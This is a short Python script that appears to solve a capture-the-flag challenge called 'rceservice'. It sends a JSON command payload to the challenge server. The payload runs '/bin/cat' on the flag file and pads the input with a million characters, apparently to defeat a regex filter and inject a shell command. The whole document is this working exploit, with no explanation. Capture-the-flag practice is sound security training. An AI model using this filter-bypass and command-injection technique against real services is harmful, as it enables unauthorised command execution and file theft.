import requests

url = 'http://challenges.fbctf.com:8085/'
payload = '{"cmd": "/bin/cat /home/rceservice/flag && ' + 'a'*1000000 + '"}'
req = requests.post(url,data = { "cmd": payload })
print(req.text)
